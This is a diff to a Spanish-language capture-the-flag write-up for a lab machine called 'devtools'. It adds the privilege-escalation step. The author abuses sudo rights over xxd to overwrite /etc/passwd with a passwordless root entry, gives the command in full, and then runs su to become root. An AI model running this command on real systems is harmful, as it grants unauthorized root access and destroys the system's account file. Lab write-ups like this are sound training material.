@@ -90,6 +90,16 @@ Ya tenemos credenciales, por lo que continuaremos conectándonos por ssh.
 
 ### Carlos
 
-Siendo el usuario carlos, ejecuto un `sudo -l` y veo que puedo ejecutar `ping` como root, por lo que no se que hacer y toca esperar al directo de mario, lo que si, hay una nota en la home de carlos
+Siendo el usuario carlos, ejecuto un `sudo -l` y veo que puedo ejecutar `ping` como root y `xxd`, por lo que luego de buscar, veo que puedo editar el `/etc/passwd` de la siguiente manera:
 
-Gracias por leer el writeup a la mitad xD :) 
+```css
+echo root::0:0:root:/root:/bin/bash | sudo xxd | sudo xxd -r - "/etc/passwd"
+```
+
+Por lo que una vez ejecutado eso, ejecutamos `su` y escalamos a root.
+
+## Root
+
+![Root](/maquina-devtools/img/root.png)
+
+Gracias por leer :)
